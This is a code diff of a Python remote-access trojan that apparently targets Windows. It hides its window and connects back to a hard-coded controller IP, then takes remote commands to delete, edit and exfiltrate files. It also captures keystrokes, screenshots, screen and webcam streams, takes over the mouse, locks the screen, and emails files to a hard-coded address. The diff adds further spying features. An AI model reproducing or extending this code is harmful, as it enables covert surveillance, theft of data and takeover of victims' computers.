@@ -1,6 +1,7 @@
 import getpass
 import os, time
 
+
 def h1de():
     try:
         import threading
@@ -35,23 +36,26 @@ def h1de():
             # disallow_Multiple_Instances()
             thread = myThread(1, "Thread", 1)
             thread.start()
+        def_hide()
     except:
         pass
 
+
 h1de()
 
-os.system("pip install pynput")
+"""os.system("pip install pynput")
 os.system("pip install keyboard")
 os.system("pip install pyautogui")
 os.system("pip install sockets")
 os.system("pip install comtypes")
 os.system("pip install pywifi")
-os.system("pip install requests")
+os.system("pip install requests")"""
 import datetime
 import pathlib
 
 from pynput.keyboard import Listener
 from pynput import keyboard
+from win32api import GetSystemMetrics
 import os, stat, shutil
 import keyboard
 import smtplib  # Импортируем библиотеку по работе с SMTP
@@ -69,8 +73,9 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
 # print(ipv4_addresses)
-ip = ""
+ip = "192.168.0.12"
 reconect = False
+
 
 def admin():
     #!!!#
@@ -83,8 +88,8 @@ def admin():
         else:
             pass
 
-#admin()
 
+#admin()
 
 
 def wa1ting(ip="192.168.0.12", s=None, it=0):
@@ -106,6 +111,28 @@ def wa1ting(ip="192.168.0.12", s=None, it=0):
         print("\nConnected")
         return [ip, s]
 
+def mouse(s=None):
+    import pyautogui
+    while True:
+        com = s.recv(1024).decode("cp65001")
+        print(com)
+        ev = com.split()[0]
+        coor = (com.split()[-1])[0:-1]
+        x, y = coor.split(", ")
+        x = int(x); y = int(y)
+        if ev == "Pointer":
+            pyautogui.moveTo(x, y)
+        elif ev == "Pressed":
+            pyautogui.click(x, y)
+        elif ev == "Scrolled":
+            break
+
+
+"""import pyautogui
+
+while True:
+    x, y = (s.recv(1024).decode("cp65001")).split()
+    pyautogui.moveTo(x, y)"""
 
 """
 This module implements the main functionality of vidstream.
@@ -126,6 +153,7 @@ import socket
 import pickle
 import struct
 import threading
+
 
 class StreamingServer:
     """
@@ -289,6 +317,7 @@ class StreamingServer:
                 self.__used_slots -= 1
                 break
 
+
 class StreamingClient:
     """
     Abstract class for the generic streaming client.
@@ -412,6 +441,7 @@ class StreamingClient:
         else:
             print("Client not streaming!")
 
+
 class CameraClient(StreamingClient):
     """
     Class for the camera streaming client.
@@ -501,6 +531,7 @@ class CameraClient(StreamingClient):
         self.__camera.release()
         cv2.destroyAllWindows()
 
+
 class VideoClient(StreamingClient):
     """
     Class for the video streaming client.
@@ -587,6 +618,7 @@ class VideoClient(StreamingClient):
         self.__video.release()
         cv2.destroyAllWindows()
 
+
 class ScreenShareClient(StreamingClient):
     """
     Class for the screen share streaming client.
@@ -624,7 +656,7 @@ class ScreenShareClient(StreamingClient):
         start_stream : starts the screen sharing stream in a new thread
     """
 
-    def __init__(self, host, port, x_res=1024, y_res=576):
+    def __init__(self, host, port, x_res=GetSystemMetrics(0), y_res=GetSystemMetrics(1)):
         """
         Creates a new instance of ScreenShareClient.
 
@@ -658,8 +690,6 @@ class ScreenShareClient(StreamingClient):
         frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
         frame = cv2.resize(frame, (self.__x_res, self.__y_res), interpolation=cv2.INTER_AREA)
         return frame
-
-
 
 
 def scan_wifi():
@@ -912,6 +942,14 @@ except:
     pathr = w[0]
     s = w[1]
     send_video(pathr)
+    """while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.connect((ip, 8888))
+        except:
+            s.close()
+        else:
+            break"""
     # s = waiting(ip, s)
 subprocess.getoutput("chcp 65001")
 
@@ -961,6 +999,7 @@ def wlk(dir):
             wlk(path)
             os.rmdir(path)
 
+
 def wolk(dir, file, checked=[], flag=False):
     try:
         for name in os.listdir(dir):
@@ -986,13 +1025,13 @@ def wolk(dir, file, checked=[], flag=False):
                     except:
                         pa = None
                     if pa == None:
-                        #path = "\\".join(path.split("\\")[0:-1])
+                        # path = "\\".join(path.split("\\")[0:-1])
                         if path in checked:
                             path = "\\".join(path.split("\\")[0:-1])
                             checked.append(path)
                         else:
                             pass
-                        #path = "\\".join(path.split("\\")[0:-1])
+                        # path = "\\".join(path.split("\\")[0:-1])
                         if not flag:
                             try:
                                 pa = wolk(path, file, flag=flag)[0]
@@ -1130,8 +1169,8 @@ dest_email = "verart1@yandex.ru"
 
 def read_file(python):
     filepath = os.path.abspath(python)
-    #ctype, encoding = mimetypes.guess_type(filepath)
-    #maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
+    # ctype, encoding = mimetypes.guess_type(filepath)
+    # maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
     with open(python, "r", encoding='utf-8') as file:  # снова читаем атакуемый файл
         original_code = ""  # вводим переменную для исходного кода атакуемого файла
         for line in file:
@@ -1139,6 +1178,7 @@ def read_file(python):
         # print(original_code)
         file.close()
     return original_code
+
 
 def find_file(path, d="max"):
     max_flag = False
@@ -1164,18 +1204,24 @@ def find_file(path, d="max"):
         pr = ["No files"]
     return pr
 
+
 def communicate():
+    full_mes = ""
     while True:
         msg = s.recv(4096).decode("utf-8") + "\n"
+        full_mes += msg
         if msg == "Stop":
             break
-        keyboard.write(msg)
+    keyboard.write(full_mes)
+
 
 def lock(pas="User"):
     import pyautogui
     from tkinter import Tk, Entry, Label
     from pyautogui import click, moveTo
     from time import sleep
+    global k
+    global entry
 
     def callback(event):
         global k, entry
@@ -1183,10 +1229,11 @@ def lock(pas="User"):
             k = True
 
     def on_closing():
-        click(width / 2, height / 2)  # закликивание в центр экрана
+        #click(width / 2, height / 2)  # закликивание в центр экрана
         moveTo(width / 2, height / 2)  # перемещение курсора в центр экрана
         root.attributes("-fullscreen", True)  # включаем полноэкранный режим
-        root.protocol("WM_DELETE_WINDOW", on_closing)  # при попытке закрыть окно с помощью диспетчера окон вызываем функцию
+        root.protocol("WM_DELETE_WINDOW",
+                      on_closing)  # при попытке закрыть окно с помощью диспетчера окон вызываем функцию
         root.update()  # постоянное обновление окна
         root.bind('<Control-KeyPress-c>', callback)  # вводим сочетание клавиш, которые будут закрывать программу
 
@@ -1214,6 +1261,8 @@ def lock(pas="User"):
 
 global screen
 global camera
+
+
 def spy(cmd_dt):
     host = ip
     global screen
@@ -1221,6 +1270,8 @@ def spy(cmd_dt):
     if cmd_dt == "screen":
         screen = ScreenShareClient(host, 9999)
         screen.start_stream()
+    elif cmd_dt == "mouse":
+        mouse(s)
     elif cmd_dt == "webcam":
         camera = CameraClient(host, 9999)
         camera.start_stream()
@@ -1230,8 +1281,7 @@ def spy(cmd_dt):
         camera.stop_stream()
 
 
-
-#s.send((getpass.getuser()).encode())
+# s.send((getpass.getuser()).encode())
 s.send((subprocess.getoutput("cd")).encode())
 print(s.recv(1024).decode())
 while 1:
@@ -1268,11 +1318,15 @@ while 1:
         elif "abbort_client" == command.split(" ")[0]:
             exit(1)
         elif "ch_dir" == command.split(" ")[0]:
-            if (command.split(" "))[-1] == "C:" or (command.split(" "))[-1] == "A:" or (command.split(" "))[-1] == "B:" or (command.split(" "))[-1] == "D:" or (command.split(" "))[-1] == "Z:" or (command.split(" "))[-1] == "F:":
+            if (command.split(" "))[-1] == "C:" or (command.split(" "))[-1] == "A:" or (command.split(" "))[
+                -1] == "B:" or (command.split(" "))[-1] == "D:" or (command.split(" "))[-1] == "Z:" or \
+                    (command.split(" "))[-1] == "F:":
                 os.chdir((command.split(" "))[-1])
                 s.send((subprocess.getoutput("cd")).encode())
                 continue
-            elif ((command.split(" "))[-1] not in os.listdir("\\".join(((os.path.abspath((command.split(" "))[-1])).split("\\"))[0:-1]))) and ((command.split(" ")[-1]) != ".."):
+            elif ((command.split(" "))[-1] not in os.listdir(
+                    "\\".join(((os.path.abspath((command.split(" "))[-1])).split("\\"))[0:-1]))) and (
+                    (command.split(" ")[-1]) != ".."):
                 s.send("No such directory.\n".encode())
                 continue
             os.chdir((command.split(" "))[-1])
@@ -1286,14 +1340,15 @@ while 1:
         elif "delete" == command.split(" ")[0]:
             if os.path.isfile((command.split(" "))[-1]):
                 try:
-                    pathlib.Path.unlink(os.path.abspath((command.split(" ")[-1])), missing_ok=True)
+                    os.remove((command.split())[-1])
+                    #pathlib.Path.unlink(os.path.abspath((command.split(" ")[-1])), missing_ok=True)
                 except:
                     try:
                         os.remove((command.split(" "))[-1])
                     except:
                         pass
             else:
-                #shutil.rmtree(str(command.split(" ")[-1]))
+                # shutil.rmtree(str(command.split(" ")[-1]))
                 """try:
                     os.listdir(os.path.normpath((command.split(" "))[-1]))
                 except FileNotFoundError:
@@ -1315,7 +1370,7 @@ while 1:
             kboard(command.split("#")[-1])
         elif "edit" == command.split(" ")[0]:
             name = (command.split(" "))[-1]
-            #s.send(read_file(name).encode())
+            # s.send(read_file(name).encode())
             if name not in os.listdir(subprocess.getoutput("cd")):
                 file = open(name, "w", encoding="utf-8")
                 file.write("New file")
@@ -1325,9 +1380,10 @@ while 1:
             file.close()
             isp = s.recv(4096 * 1024).decode("utf-8")
             with open(name, "w", encoding="utf-8") as fl:
-                fl.write(isp); fl.close()
+                fl.write(isp);
+                fl.close()
             s.send(read_file(name).encode("utf-8"))
-            #s.send((or_co).encode())
+            # s.send((or_co).encode())
         elif "find_file" == command.split(" ")[0]:
             spl = command.split(" ")
             path = find_file(spl[1])
@@ -1339,9 +1395,9 @@ while 1:
             else:
                 lock()
         elif command == "dialog":
-            subprocess.getoutput("notepad")
+            #subprocess.getoutput("notepad")
             communicate()
-            keyboard.press_and_release("ctrl+s", "Alt+F4")
+            #keyboard.press_and_release("ctrl+s", "Alt+F4")
         elif "spy" == command.split(" ")[0]:
             spy(command.split(" ")[-1])
         elif "start" == command.split(" ")[0]:
@@ -1355,6 +1411,8 @@ while 1:
             cd = True
             file = (command.split(" "))[1]
             send_email(dest_email, file)
+        elif "spy_mouse" == command:
+            mouse(s)
         elif "send_file" == command.split(" ")[0]:
             guts = s.recv(4096 * 1024).decode("utf-8")
             f = open("sended_" + command.split(" ")[-1], "w", encoding="utf-8")
@@ -1365,9 +1423,9 @@ while 1:
             s.send(rf.encode())
         elif command == "screenshot":
             screen = pyautogui.screenshot("screenshot.png")
-            #send_email(addr_to="verart1@yandex.ru", f1le="screenshot.png")
+            # send_email(addr_to="verart1@yandex.ru", f1le="screenshot.png")
             del screen
-            #os.remove("screenshot.png")
+            # os.remove("screenshot.png")
         elif command == "" or command == "\n":
             pass
         else:
@@ -1378,9 +1436,9 @@ while 1:
         try:
             s.connect((ip, 8888))
         except:
-            #s = waiting(ip, s)
+            # s = waiting(ip, s)
             reconect = True
-            #_ = ti(perm_dt, end_dt)
+            # _ = ti(perm_dt, end_dt)
             perm_dt = str(datetime.datetime.now())
             per = perm_dt.split(" ")[-1]
             per = "=".join(per.split(":"))
